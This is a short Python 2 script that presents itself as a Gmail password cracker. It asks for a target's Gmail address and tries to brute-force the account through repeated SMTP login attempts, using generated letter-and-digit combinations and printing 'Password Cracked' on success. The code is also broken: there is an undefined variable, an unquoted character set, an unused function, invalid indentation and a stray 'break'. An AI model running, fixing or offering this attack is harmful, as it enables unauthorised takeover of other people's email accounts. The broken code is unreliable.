import itertools 
import smtplib 
smtpserver = smtplib.SMTP("smtp.gmail.com", 587) 
smtpserver.ehlo() 
smtpserver.starttls() 
user = raw_input("Enter Target's Gmail Address: ") 

def print_perms(chars, minlen, maxlen): 
for n in range(6, 12+1): 
   for perm in itertools.product(abcdefghijklmnopqrstuvwxyz1234567890, repeat=n): 
      if(''.join(perm) == symbols):
         return 0

try: 
    smtpserver.login(user, symbols) 
    print "[+] Password Cracked: %s" % symbols 
    break; 
except smtplib.SMTPAuthenticationError: 
    print "[!] Password Inccorect: %s" % symbols
